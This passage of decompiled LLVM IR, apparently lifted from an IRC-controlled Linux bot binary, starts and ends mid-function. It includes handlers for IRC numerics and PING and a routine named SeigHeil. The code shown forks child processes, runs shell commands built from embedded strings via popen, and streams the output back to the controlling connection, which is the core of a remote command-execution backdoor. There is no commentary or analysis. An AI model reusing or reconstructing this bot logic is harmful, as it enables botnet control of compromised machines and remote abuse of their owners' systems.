dec_label_pc_8054698:                             ; preds = %dec_label_pc_805462c, %dec_label_pc_80545d9
  %v1_805469e = call i32 @pclose(i32 %v4_805461f)
  %v1_80546ab = call i32 @__GI_exit(i32 0)
  store i32 %v1_80546ab, i32* @eax, align 4
  br label %dec_label_pc_80546b0

dec_label_pc_80546b0:                             ; preds = %dec_label_pc_80545a6, %dec_label_pc_8054698
  %v3_80546ba = load i8*, i8** %stack_var_-64, align 4
  %v5_80546bd = call i32 @__GI_strncmp(i8* %v3_80546ba, i32 ptrtoint ([6 x i8]* @global_var_806c43e.614 to i32), i32 5)
  store i32 %v5_80546bd, i32* @eax, align 4
  %v1_80546c5 = icmp eq i32 %v5_80546bd, 0
  %v1_80546c7 = icmp eq i1 %v1_80546c5, false
  br i1 %v1_80546c7, label %dec_label_pc_80547ba, label %dec_label_pc_80546cd

dec_label_pc_80546cd:                             ; preds = %dec_label_pc_80546b0
  %v1_80546d3 = call i32 @mfork(i32 %v4_8053ca2)
  %v1_80546db = icmp eq i32 %v1_80546d3, 0
  %v1_80546dd = icmp eq i1 %v1_80546db, false
  br i1 %v1_80546dd, label %dec_label_pc_8054ab3, label %dec_label_pc_80546e3

dec_label_pc_80546e3:                             ; preds = %dec_label_pc_80546cd
  %v2_80546ed = ptrtoint i32* %stack_var_-2168 to i32
  %v4_80546f4 = bitcast i32* %stack_var_-2168 to i8*
  %v5_80546f4 = call i32 @__GI_memset(i8* %v4_80546f4, i32 0, i32 1024)
  %v3_8054712 = call i32 @sprintf(i32 %v2_80546ed, i32 ptrtoint ([405 x i8]* @global_var_806c444.615 to i32))
  store i32 %v2_80546ed, i32* @eax, align 4
  %v4_8054729 = call i32 @popen(i32 %v2_80546ed, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_806915a.88, i32 0, i32 0))
  %v1_8054796 = inttoptr i32 %v4_8054729 to i32*
  %v2_8054796165 = call i32 @feof(i32* %v1_8054796)
  %v1_805479e166 = icmp eq i32 %v2_8054796165, 0
  br i1 %v1_805479e166, label %dec_label_pc_8054736, label %dec_label_pc_80547a2

dec_label_pc_8054736:                             ; preds = %dec_label_pc_80546e3, %dec_label_pc_8054736
  %v5_8054747 = call i32 @__GI_memset(i8* %v4_80546f4, i32 0, i32 1024)
  %v4_8054761 = call i32 @fgets(i32 %v2_80546ed, i32 1024, i32 %v4_8054729)
  %v3_805477b = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_806bb4d.599 to i32))
  %v1_8054788 = call i32 @sleep(i32 1)
  %v2_8054796 = call i32 @feof(i32* %v1_8054796)
  %v1_805479e = icmp eq i32 %v2_8054796, 0
  br i1 %v1_805479e, label %dec_label_pc_8054736, label %dec_label_pc_80547a2

dec_label_pc_80547a2:                             ; preds = %dec_label_pc_8054736, %dec_label_pc_80546e3
  %v1_80547a8 = call i32 @pclose(i32 %v4_8054729)
  %v1_80547b5 = call i32 @__GI_exit(i32 0)
  store i32 %v1_80547b5, i32* @eax, align 4
  br label %dec_label_pc_80547ba

dec_label_pc_80547ba:                             ; preds = %dec_label_pc_80546b0, %dec_label_pc_80547a2
  %v3_80547c4 = load i8*, i8** %stack_var_-64, align 4
  %v5_80547c7 = call i32 @__GI_strncmp(i8* %v3_80547c4, i32 ptrtoint ([6 x i8]* @global_var_806c5d9.616 to i32), i32 5)
  store i32 %v5_80547c7, i32* @eax, align 4
  %v1_80547cf = icmp eq i32 %v5_80547c7, 0
  %v1_80547d1 = icmp eq i1 %v1_80547cf, false
  br i1 %v1_80547d1, label %dec_label_pc_80548c4, label %dec_label_pc_80547d7

dec_label_pc_80547d7:                             ; preds = %dec_label_pc_80547ba
  %v1_80547dd = call i32 @mfork(i32 %v4_8053ca2)
  %v1_80547e5 = icmp eq i32 %v1_80547dd, 0
  %v1_80547e7 = icmp eq i1 %v1_80547e5, false
  br i1 %v1_80547e7, label %dec_label_pc_8054ab3, label %dec_label_pc_80547ed

dec_label_pc_80547ed:                             ; preds = %dec_label_pc_80547d7
  %v2_80547f7 = ptrtoint i32* %stack_var_-2168 to i32
  %v4_80547fe = bitcast i32* %stack_var_-2168 to i8*
  %v5_80547fe = call i32 @__GI_memset(i8* %v4_80547fe, i32 0, i32 1024)
  %v3_805481c = call i32 @sprintf(i32 %v2_80547f7, i32 ptrtoint ([98 x i8]* @global_var_806c5e0.617 to i32))
  store i32 %v2_80547f7, i32* @eax, align 4
  %v4_8054833 = call i32 @popen(i32 %v2_80547f7, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_806915a.88, i32 0, i32 0))
  %v1_80548a0 = inttoptr i32 %v4_8054833 to i32*
  %v2_80548a0163 = call i32 @feof(i32* %v1_80548a0)
  %v1_80548a8164 = icmp eq i32 %v2_80548a0163, 0
  br i1 %v1_80548a8164, label %dec_label_pc_8054840, label %dec_label_pc_80548ac

dec_label_pc_8054840:                             ; preds = %dec_label_pc_80547ed, %dec_label_pc_8054840
  %v5_8054851 = call i32 @__GI_memset(i8* %v4_80547fe, i32 0, i32 1024)
  %v4_805486b = call i32 @fgets(i32 %v2_80547f7, i32 1024, i32 %v4_8054833)
  %v3_8054885 = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_806bb4d.599 to i32))
  %v1_8054892 = call i32 @sleep(i32 1)
  %v2_80548a0 = call i32 @feof(i32* %v1_80548a0)
  %v1_80548a8 = icmp eq i32 %v2_80548a0, 0
  br i1 %v1_80548a8, label %dec_label_pc_8054840, label %dec_label_pc_80548ac

dec_label_pc_80548ac:                             ; preds = %dec_label_pc_8054840, %dec_label_pc_80547ed
  %v1_80548b2 = call i32 @pclose(i32 %v4_8054833)
  %v1_80548bf = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_80548c4

dec_label_pc_80548c4:                             ; preds = %dec_label_pc_80547ba, %dec_label_pc_80548ac
  %v3_80548c4 = load i8*, i8** %stack_var_-64, align 4
  %v3_80548db = call i32 @_strlen(i8* %v3_80548c4)
  %v5_805491b156 = icmp sgt i32 %v3_80548db, 0
  %v3_80548ee157 = load i8*, i8** %stack_var_-64, align 4
  br i1 %v5_805491b156, label %dec_label_pc_80548ee, label %dec_label_pc_8054938

dec_label_pc_80548ee:                             ; preds = %dec_label_pc_80548c4, %dec_label_pc_8054900
  %v3_80548ee159 = phi i8* [ %v22_805490f, %dec_label_pc_8054900 ], [ %v3_80548ee157, %dec_label_pc_80548c4 ]
  %storemerge9158 = phi i32 [ %v4_8054912, %dec_label_pc_8054900 ], [ 0, %dec_label_pc_80548c4 ]
  %v4_80548ee = ptrtoint i8* %v3_80548ee159 to i32
  %v2_80548f1 = load i8, i8* %v3_80548ee159, align 1
  %v5_80548f1 = and i32 %v4_80548ee, -256
  %v7_80548f3 = icmp eq i8 %v2_80548f1, 32
  br i1 %v7_80548f3, label %dec_label_pc_8054938, label %dec_label_pc_80548f7

dec_label_pc_80548f7:                             ; preds = %dec_label_pc_80548ee
  %v2_80548fa = load i8, i8* %v3_80548ee159, align 1
  %v4_80548fc = icmp eq i8 %v2_80548fa, 0
  br i1 %v4_80548fc, label %dec_label_pc_8054938, label %dec_label_pc_8054900

dec_label_pc_8054900:                             ; preds = %dec_label_pc_80548f7
  store i32 %v4_80548ee, i32* %edx.global-to-local, align 4
  %v2_8054906 = load i8, i8* %v3_80548ee159, align 1
  %v3_8054906 = zext i8 %v2_8054906 to i32
  %v6_8054906 = or i32 %v3_8054906, %v5_80548f1
  store i32 %v6_8054906, i32* %edx.global-to-local, align 4
  %v2_8054908 = load i32, i32* @ebp, align 4
  %v4_8054908 = add nsw i32 %storemerge9158, -1140
  %v5_8054908 = add i32 %v4_8054908, %v2_8054908
  %v6_8054908 = inttoptr i32 %v5_8054908 to i8*
  store i8 %v2_8054906, i8* %v6_8054908, align 1
  %v3_805490f = load i8*, i8** %stack_var_-64, align 4
  %v4_805490f = ptrtoint i8* %v3_805490f to i32
  %v5_805490f = add i32 %v4_805490f, 1
  %v22_805490f = inttoptr i32 %v5_805490f to i8*
  store i8* %v22_805490f, i8** %stack_var_-64, align 4
  %v4_8054912 = add nuw nsw i32 %storemerge9158, 1
  %v5_805491b = icmp slt i32 %v4_8054912, %v3_80548db
  br i1 %v5_805491b, label %dec_label_pc_80548ee, label %dec_label_pc_8054938

dec_label_pc_8054926:                             ; preds = %dec_label_pc_8054938
  %v4_8054929 = load i8*, i8** %stack_var_-64, align 4
  %v5_8054929 = ptrtoint i8* %v4_8054929 to i32
  %v6_8054929 = add i32 %v5_8054929, %storemerge8
  %v1_805492c = inttoptr i32 %v6_8054929 to i8*
  %v2_805492c = load i8, i8* %v1_805492c, align 1
  %v7_805492e = icmp eq i8 %v2_805492c, 32
  %v1_8054930 = icmp eq i1 %v7_805492e, false
  br i1 %v1_8054930, label %dec_label_pc_8054935, label %dec_label_pc_8054932

dec_label_pc_8054932:                             ; preds = %dec_label_pc_8054926
  %v4_8054932 = add i32 %stack_var_-60.1, 1
  br label %dec_label_pc_8054935

dec_label_pc_8054935:                             ; preds = %dec_label_pc_8054926, %dec_label_pc_8054932
  %stack_var_-60.0 = phi i32 [ %stack_var_-60.1, %dec_label_pc_8054926 ], [ %v4_8054932, %dec_label_pc_8054932 ]
  %v4_8054935 = add i32 %storemerge8, 1
  br label %dec_label_pc_8054938

dec_label_pc_8054938:                             ; preds = %dec_label_pc_80548c4, %dec_label_pc_80548f7, %dec_label_pc_80548ee, %dec_label_pc_8054900, %dec_label_pc_8054935
  %v3_805493b = phi i8* [ %v4_8054929, %dec_label_pc_8054935 ], [ %v3_80548ee157, %dec_label_pc_80548c4 ], [ %v3_80548ee159, %dec_label_pc_80548f7 ], [ %v3_80548ee159, %dec_label_pc_80548ee ], [ %v22_805490f, %dec_label_pc_8054900 ]
  %stack_var_-60.1 = phi i32 [ %stack_var_-60.0, %dec_label_pc_8054935 ], [ 0, %dec_label_pc_80548c4 ], [ 0, %dec_label_pc_80548f7 ], [ 0, %dec_label_pc_80548ee ], [ 0, %dec_label_pc_8054900 ]
  %storemerge8 = phi i32 [ %v4_8054935, %dec_label_pc_8054935 ], [ 0, %dec_label_pc_80548c4 ], [ 0, %dec_label_pc_80548f7 ], [ 0, %dec_label_pc_80548ee ], [ 0, %dec_label_pc_8054900 ]
  store i32 %storemerge8, i32* %edx.global-to-local, align 4
  %v4_805493b = ptrtoint i8* %v3_805493b to i32
  store i1 false, i1* @df, align 1
  store i32 %v4_805493b, i32* @edi, align 4
  %v3_8054952 = call i32 @_strlen(i8* %v3_805493b)
  %v7_8054959 = icmp ult i32 %storemerge8, %v3_8054952
  br i1 %v7_8054959, label %dec_label_pc_8054926, label %dec_label_pc_805495d

dec_label_pc_805495d:                             ; preds = %dec_label_pc_8054938
  %v4_805495d = add i32 %stack_var_-60.1, 1
  %v7_8054964 = icmp sgt i32 %v4_805495d, 10
  %.v4_805495d = select i1 %v7_8054964, i32 10, i32 %v4_805495d
  %v0_805497a = load i32, i32* @ebp, align 4
  %tmp = mul i32 %.v4_805495d, 4
  %v3_805497a = add i32 %tmp, -112
  %v4_805497a = add i32 %v3_805497a, %v0_805497a
  %v5_805497a = inttoptr i32 %v4_805497a to i32*
  store i32 ptrtoint (i32* @global_var_8068a6a.618 to i32), i32* %v5_805497a, align 4
  %tmp131 = bitcast i8** %stack_var_-64 to i32*
  %v3_8054a24.pre = load i8*, i8** %stack_var_-64, align 4
  %v4_8054a24143 = ptrtoint i8* %v3_8054a24.pre to i32
  %v2_8054a27144 = load i8, i8* %v3_8054a24.pre, align 1
  %v4_8054a29148 = icmp eq i8 %v2_8054a27144, 0
  %v1_8054a2b149 = icmp eq i1 %v4_8054a29148, false
  br i1 %v1_8054a2b149, label %dec_label_pc_805498e, label %dec_label_pc_8054a31

dec_label_pc_805498e:                             ; preds = %dec_label_pc_805495d, %dec_label_pc_80549da
  %v4_8054a24151 = phi i32 [ %v6_8054a21, %dec_label_pc_80549da ], [ %v4_8054a24143, %dec_label_pc_805495d ]
  %stack_var_-56.0150 = phi i32 [ %v4_8054a1b, %dec_label_pc_80549da ], [ 1, %dec_label_pc_805495d ]
  %v5_805498e = add i32 %v4_8054a24151, 1
  %v22_805498e = inttoptr i32 %v5_805498e to i8*
  store i8* %v22_805498e, i8** %stack_var_-64, align 4
  %v5_8054997 = icmp slt i32 %stack_var_-56.0150, %.v4_805495d
  br i1 %v5_8054997, label %dec_label_pc_80549a9, label %dec_label_pc_8054a31

dec_label_pc_80549a6:                             ; preds = %dec_label_pc_80549ce
  %v4_80549a6 = add i32 %storemerge7, 1
  br label %dec_label_pc_80549a9

dec_label_pc_80549a9:                             ; preds = %dec_label_pc_805498e, %dec_label_pc_80549a6
  %v3_80549ac = phi i8* [ %v4_80549d1, %dec_label_pc_80549a6 ], [ %v22_805498e, %dec_label_pc_805498e ]
  %storemerge7 = phi i32 [ %v4_80549a6, %dec_label_pc_80549a6 ], [ 0, %dec_label_pc_805498e ]
  store i32 %storemerge7, i32* %edx.global-to-local, align 4
  %v4_80549ac = ptrtoint i8* %v3_80549ac to i32
  store i1 false, i1* @df, align 1
  store i32 %v4_80549ac, i32* @edi, align 4
  %v3_80549c3 = call i32 @_strlen(i8* %v3_80549ac)
  %v4_80549c3 = mul i32 %v3_80549c3, -1
  %v5_80549c3 = add i32 %v4_80549c3, -2
  store i32 %v5_80549c3, i32* @ecx, align 4
  %v1_80549c9 = sub i32 0, %v4_80549c3
  %v0_80549ca = load i32, i32* %edx.global-to-local, align 4
  %v7_80549ca = icmp ult i32 %v0_80549ca, %v1_80549c9
  %v1_80549cc = icmp eq i1 %v7_80549ca, false
  br i1 %v1_80549cc, label %dec_label_pc_80549da, label %dec_label_pc_80549ce

dec_label_pc_80549ce:                             ; preds = %dec_label_pc_80549a9
  %v4_80549d1 = load i8*, i8** %stack_var_-64, align 4
  %v5_80549d1 = ptrtoint i8* %v4_80549d1 to i32
  %v6_80549d1 = add i32 %v5_80549d1, %storemerge7
  %v1_80549d4 = inttoptr i32 %v6_80549d1 to i8*
  %v2_80549d4 = load i8, i8* %v1_80549d4, align 1
  %v7_80549d6 = icmp eq i8 %v2_80549d4, 32
  %v1_80549d8 = icmp eq i1 %v7_80549d6, false
  br i1 %v1_80549d8, label %dec_label_pc_80549a6, label %dec_label_pc_80549da

dec_label_pc_80549da:                             ; preds = %dec_label_pc_80549ce, %dec_label_pc_80549a9
  store i32 %stack_var_-56.0150, i32* @ebx, align 4
  %v1_80549e0 = add i32 %storemerge7, 1
  %v1_80549e5 = call i32 @malloc(i32 %v1_80549e0)
  %v1_80549ed = load i32, i32* @ebp, align 4
  %v2_80549ed = load i32, i32* @ebx, align 4
  %v3_80549ed = mul i32 %v2_80549ed, 4
  %v4_80549ed = add i32 %v1_80549ed, -116
  %v5_80549ed = add i32 %v4_80549ed, %v3_80549ed
  %v6_80549ed = inttoptr i32 %v5_80549ed to i32*
  store i32 %v1_80549e5, i32* %v6_80549ed, align 4
  store i32 %storemerge7, i32* %edx.global-to-local, align 4
  %v0_80549f7 = load i32, i32* @ebp, align 4
  %v2_80549f7 = mul nuw nsw i32 %stack_var_-56.0150, 4
  %v3_80549f7 = add nuw nsw i32 %v2_80549f7, -116
  %v4_80549f7 = add i32 %v0_80549f7, %v3_80549f7
  %v5_80549f7 = inttoptr i32 %v4_80549f7 to i32*
  %v6_80549f7 = load i32, i32* %v5_80549f7, align 4
  %v3_80549ff6 = load i32, i32* %tmp131, align 4
  %v4_8054a03 = inttoptr i32 %v6_80549f7 to i8*
  %v5_8054a03 = call i32 @strncpy(i8* %v4_8054a03, i32 %v3_80549ff6, i32 %storemerge7)
  %v0_8054a0e = load i32, i32* @ebp, align 4
  %v4_8054a0e = add i32 %v0_8054a0e, %v3_80549f7
  %v5_8054a0e = inttoptr i32 %v4_8054a0e to i32*
  %v6_8054a0e = load i32, i32* %v5_8054a0e, align 4
  store i32 %v6_8054a0e, i32* %edx.global-to-local, align 4
  %v2_8054a15 = add i32 %v6_8054a0e, %storemerge7
  %v1_8054a18 = inttoptr i32 %v2_8054a15 to i8*
  store i8 0, i8* %v1_8054a18, align 1
  %v4_8054a1b = add nuw nsw i32 %stack_var_-56.0150, 1
  %v3_8054a21 = load i8*, i8** %stack_var_-64, align 4
  %v4_8054a21 = ptrtoint i8* %v3_8054a21 to i32
  %v6_8054a21 = add i32 %v4_8054a21, %storemerge7
  %v26_8054a21 = inttoptr i32 %v6_8054a21 to i8*
  store i8* %v26_8054a21, i8** %stack_var_-64, align 4
  %v2_8054a27 = load i8, i8* %v26_8054a21, align 1
  %v4_8054a29 = icmp eq i8 %v2_8054a27, 0
  %v1_8054a2b = icmp eq i1 %v4_8054a29, false
  br i1 %v1_8054a2b, label %dec_label_pc_805498e, label %dec_label_pc_8054a31

dec_label_pc_8054a31:                             ; preds = %dec_label_pc_80549da, %dec_label_pc_805498e, %dec_label_pc_805495d
  %v4_8054aa8 = load i32, i32* bitcast ([4 x i8]** @global_var_806f740.620 to i32*), align 8
  %v1_8054aaf = icmp eq i32 %v4_8054aa8, 0
  %v1_8054ab1 = icmp eq i1 %v1_8054aaf, false
  br i1 %v1_8054ab1, label %dec_label_pc_8054a3a, label %dec_label_pc_8054ab3

dec_label_pc_8054a3a:                             ; preds = %dec_label_pc_8054a31
  store i32 %v4_8054aa8, i32* %edx.global-to-local, align 4
  %v3_8054a4f = inttoptr i32 %v4_8054aa8 to i8*
  %v4_8054a4f = call i32 @__GI_strcasecmp(i8* %v3_8054a4f, i32 %v2_8053d7c)
  %v4_8054a5e = load i32, i32* @global_var_806f744.621, align 4
  store i32 %v4_8054a5e, i32* @ecx, align 4
  %v1_8054a68 = add i32 %.v4_805495d, -1
  store i32 %v1_8054a68, i32* %edx.global-to-local, align 4
  call void @__pseudo_call(i32 %v4_8054a5e)
  %v5_8054a9e141 = icmp sgt i32 %.v4_805495d, 1
  br i1 %v5_8054a9e141, label %dec_label_pc_8054a82.lr.ph, label %dec_label_pc_8054ab3

dec_label_pc_8054a82.lr.ph:                       ; preds = %dec_label_pc_8054a3a
  br label %dec_label_pc_8054a82

dec_label_pc_8054a82:                             ; preds = %dec_label_pc_8054a82.lr.ph, %dec_label_pc_8054a82
  %storemerge142 = phi i32 [ 1, %dec_label_pc_8054a82.lr.ph ], [ %v4_8054a95, %dec_label_pc_8054a82 ]
  %v0_8054a85 = load i32, i32* @ebp, align 4
  %v2_8054a85 = mul nuw nsw i32 %storemerge142, 4
  %v3_8054a85 = add nuw nsw i32 %v2_8054a85, -116
  %v4_8054a85 = add i32 %v3_8054a85, %v0_8054a85
  %v5_8054a85 = inttoptr i32 %v4_8054a85 to i32*
  %v6_8054a85 = load i32, i32* %v5_8054a85, align 4
  %v1_8054a8d = call i32 @free(i32 %v6_8054a85)
  %v4_8054a95 = add nuw nsw i32 %storemerge142, 1
  %v5_8054a9e = icmp slt i32 %v4_8054a95, %.v4_805495d
  br i1 %v5_8054a9e, label %dec_label_pc_8054a82, label %dec_label_pc_8054ab3

dec_label_pc_8054ab3:                             ; preds = %dec_label_pc_8054a3a, %dec_label_pc_8054a82, %dec_label_pc_8054a31, %dec_label_pc_80547d7, %dec_label_pc_80546cd, %dec_label_pc_80545c3, %dec_label_pc_80544b9, %dec_label_pc_80543af, %dec_label_pc_80542a5, %dec_label_pc_805419b, %dec_label_pc_8054091, %dec_label_pc_8053f87, %dec_label_pc_8053e7d, %dec_label_pc_8053ddd, %dec_label_pc_8053d60, %dec_label_pc_8053d4a, %entry
  %v0_8054ab9 = phi i32 [ %v4_8054aa8, %dec_label_pc_8054a31 ], [ %v1_80547dd, %dec_label_pc_80547d7 ], [ %v1_80546d3, %dec_label_pc_80546cd ], [ %v1_80545c9, %dec_label_pc_80545c3 ], [ %v1_80544bf, %dec_label_pc_80544b9 ], [ %v1_80543b5, %dec_label_pc_80543af ], [ %v1_80542ab, %dec_label_pc_80542a5 ], [ %v1_80541a1, %dec_label_pc_805419b ], [ %v1_8054097, %dec_label_pc_8054091 ], [ %v1_8053f8d, %dec_label_pc_8053f87 ], [ %v1_8053e83, %dec_label_pc_8053e7d ], [ %v4_8053df2, %dec_label_pc_8053ddd ], [ %v4_8053d6c, %dec_label_pc_8053d60 ], [ %v6_8053d56, %dec_label_pc_8053d4a ], [ 0, %entry ], [ 1, %dec_label_pc_8054a3a ], [ %.v4_805495d, %dec_label_pc_8054a82 ]
  ret i32 %v0_8054ab9

; uselistorder directives
  uselistorder i32 %storemerge142, { 1, 0 }
  uselistorder i32 %v6_8054a21, { 1, 0 }
  uselistorder i8* %v4_80549d1, { 1, 0 }
  uselistorder i32 %storemerge7, { 0, 1, 2, 3, 4, 5, 7, 6 }
  uselistorder i8* %v3_80549ac, { 1, 0 }
  uselistorder i32 %stack_var_-56.0150, { 3, 2, 1, 0 }
  uselistorder i32 %.v4_805495d, { 1, 5, 2, 4, 3, 0 }
  uselistorder i32 %storemerge8, { 0, 3, 1, 2 }
  uselistorder i8* %v3_805493b, { 1, 0 }
  uselistorder i32 %v4_8054912, { 1, 0 }
  uselistorder i8* %v22_805490f, { 0, 2, 1 }
  uselistorder i8* %v3_80548ee159, { 0, 1, 5, 4, 3, 2 }
  uselistorder i32* %v1_80548a0, { 1, 0 }
  uselistorder i32 %v4_8054833, { 1, 0, 2 }
  uselistorder i32* %v1_8054796, { 1, 0 }
  uselistorder i32 %v4_8054729, { 1, 0, 2 }
  uselistorder i32* %v1_805468c, { 1, 0 }
  uselistorder i32 %v4_805461f, { 1, 0, 2 }
  uselistorder i32* %v1_8054582, { 1, 0 }
  uselistorder i32 %v4_8054515, { 1, 0, 2 }
  uselistorder i32* %v1_8054478, { 1, 0 }
  uselistorder i32 %v4_805440b, { 1, 0, 2 }
  uselistorder i32* %v1_805436e, { 1, 0 }
  uselistorder i32 %v4_8054301, { 1, 0, 2 }
  uselistorder i32* %v1_8054264, { 1, 0 }
  uselistorder i32 %v4_80541f7, { 1, 0, 2 }
  uselistorder i32* %v1_805415a, { 1, 0 }
  uselistorder i32 %v4_80540ed, { 1, 0, 2 }
  uselistorder i32* %v1_8054050, { 1, 0 }
  uselistorder i32 %v4_8053fe3, { 1, 0, 2 }
  uselistorder i32* %v1_8053f46, { 1, 0 }
  uselistorder i32 %v4_8053ed9, { 1, 0, 2 }
  uselistorder i32 %storemerge10, { 2, 1, 0, 4, 3 }
  uselistorder i8* %v3_8053daf, { 1, 0 }
  uselistorder i32 %storemerge11, { 1, 0, 3, 2 }
  uselistorder i32 %.pre, { 0, 2, 1 }
  uselistorder i32 %storemerge12, { 1, 0, 3, 2 }
  uselistorder i32 %v4_8053ca2, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 11, 12 }
  uselistorder i32* %stack_var_-2168, { 0, 10, 1, 11, 2, 12, 3, 13, 4, 14, 5, 15, 6, 16, 7, 17, 8, 18, 9, 19 }
  uselistorder i8** %stack_var_-64, { 28, 27, 26, 25, 1, 3, 24, 23, 22, 0, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 2, 7, 6, 5, 4 }
  uselistorder i32 (i32)* @pclose, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint ([15 x i8]* @global_var_806bb4d.599 to i32), { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32*)* @feof, { 10, 9, 11, 8, 12, 7, 13, 6, 14, 5, 15, 4, 16, 3, 17, 2, 18, 1, 19, 0 }
  uselistorder [2 x i8]* @global_var_806915a.88, { 1, 0 }
  uselistorder i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_806915a.88, i32 0, i32 0), { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @mfork, { 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint ([30 x i8]* @global_var_8068af4.30 to i32), { 1, 0 }
  uselistorder i8* @global_var_8074070.28, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg1, { 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8054ab3, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder label %dec_label_pc_8054a82, { 1, 0 }
  uselistorder label %dec_label_pc_80549a9, { 1, 0 }
  uselistorder label %dec_label_pc_805498e, { 1, 0 }
  uselistorder label %dec_label_pc_8054938, { 4, 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8054935, { 1, 0 }
  uselistorder label %dec_label_pc_80548ee, { 1, 0 }
  uselistorder label %dec_label_pc_80548c4, { 1, 0 }
  uselistorder label %dec_label_pc_8054840, { 1, 0 }
  uselistorder label %dec_label_pc_80547ba, { 1, 0 }
  uselistorder label %dec_label_pc_8054736, { 1, 0 }
  uselistorder label %dec_label_pc_80546b0, { 1, 0 }
  uselistorder label %dec_label_pc_805462c, { 1, 0 }
  uselistorder label %dec_label_pc_80545a6, { 1, 0 }
  uselistorder label %dec_label_pc_8054522, { 1, 0 }
  uselistorder label %dec_label_pc_805449c, { 1, 0 }
  uselistorder label %dec_label_pc_8054418, { 1, 0 }
  uselistorder label %dec_label_pc_8054392, { 1, 0 }
  uselistorder label %dec_label_pc_805430e, { 1, 0 }
  uselistorder label %dec_label_pc_8054288, { 1, 0 }
  uselistorder label %dec_label_pc_8054204, { 1, 0 }
  uselistorder label %dec_label_pc_805417e, { 1, 0 }
  uselistorder label %dec_label_pc_80540fa, { 1, 0 }
  uselistorder label %dec_label_pc_8054074, { 1, 0 }
  uselistorder label %dec_label_pc_8053ff0, { 1, 0 }
  uselistorder label %dec_label_pc_8053f6a, { 1, 0 }
  uselistorder label %dec_label_pc_8053ee6, { 1, 0 }
  uselistorder label %dec_label_pc_8053e60, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8053ddd, { 1, 0 }
  uselistorder label %dec_label_pc_8053dac, { 1, 0 }
  uselistorder label %dec_label_pc_8053d4a, { 1, 0 }
  uselistorder label %dec_label_pc_8053d19, { 1, 0 }
  uselistorder label %dec_label_pc_8053cc1, { 1, 0 }
}

define i32 @_376(i32 %arg1) local_unnamed_addr {
entry:
  %v3_8054ad1 = call i32 @Send(i32 %arg1, i32 ptrtoint ([13 x i8]* @global_var_806c642.622 to i32))
  %v3_8054aee = call i32 @Send(i32 %arg1, i32 ptrtoint ([13 x i8]* @global_var_806c64f.624 to i32))
  %v3_8054b07 = call i32 @Send(i32 %arg1, i32 ptrtoint ([8 x i8]* @global_var_806c65c.625 to i32))
  %v0_8054b0f = load i32, i32* @global_var_8074068.296, align 8
  %v1_8054b14 = icmp eq i32 %v0_8054b0f, 0
  %v1_8054b16 = icmp eq i1 %v1_8054b14, false
  br i1 %v1_8054b16, label %dec_label_pc_8054b26, label %dec_label_pc_8054b18

dec_label_pc_8054b18:                             ; preds = %entry
  %v1_8054b1e = call i32 @SeigHeil(i32 %arg1)
  br label %dec_label_pc_8054b26

dec_label_pc_8054b26:                             ; preds = %entry, %dec_label_pc_8054b18
  %v0_8054b27 = phi i32 [ %v0_8054b0f, %entry ], [ %v1_8054b1e, %dec_label_pc_8054b18 ]
  ret i32 %v0_8054b27

; uselistorder directives
  uselistorder i32 (i32)* @SeigHeil, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8054b26, { 1, 0 }
}

define i32 @_PING(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_8054b3c = call i32 @Send(i32 %arg1, i32 ptrtoint ([9 x i8]* @global_var_806c664.626 to i32))
  ret i32 %v3_8054b3c
}

define i32 @_352(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i8, align 1
  br label %dec_label_pc_8054b6a.preheader

dec_label_pc_8054b64:                             ; preds = %dec_label_pc_8054b89
  %v5_8054b64 = add i32 %.pre38, 1
  %v22_8054b64 = inttoptr i32 %v5_8054b64 to i8*
  %v4_8054b67 = add i32 %stack_var_-28.0, 1
  br label %dec_label_pc_8054b6a

dec_label_pc_8054b6a:                             ; preds = %dec_label_pc_8054b6a.preheader, %dec_label_pc_8054b64
  %stack_var_-28.0 = phi i32 [ %v4_8054b67, %dec_label_pc_8054b64 ], [ %stack_var_-28.171, %dec_label_pc_8054b6a.preheader ]
  %stack_var_-20.0 = phi i8* [ %v22_8054b64, %dec_label_pc_8054b64 ], [ %stack_var_-20.172, %dec_label_pc_8054b6a.preheader ]
  %v3_8054b7e = call i32 @_strlen(i8* %arg2)
  %v7_8054b85 = icmp ult i32 %stack_var_-28.0, %v3_8054b7e
  %v1_8054b87 = icmp eq i1 %v7_8054b85, false
  %.pre38 = ptrtoint i8* %stack_var_-20.0 to i32
  br i1 %v1_8054b87, label %dec_label_pc_8054b92, label %dec_label_pc_8054b89

dec_label_pc_8054b89:                             ; preds = %dec_label_pc_8054b6a
  %v2_8054b8c = load i8, i8* %stack_var_-20.0, align 1
  %v7_8054b8e = icmp eq i8 %v2_8054b8c, 32
  %v1_8054b90 = icmp eq i1 %v7_8054b8e, false
  br i1 %v1_8054b90, label %dec_label_pc_8054b64, label %dec_label_pc_8054b92

dec_label_pc_8054b92:                             ; preds = %dec_label_pc_8054b6a, %dec_label_pc_8054b89
  %v5_8054b92 = add i32 %.pre38, 1
  %v3_8054ba9 = call i32 @_strlen(i8* %arg2)
  %v4_8054ba9 = mul i32 %v3_8054ba9, -1
  %v1_8054baf = sub i32 0, %v4_8054ba9
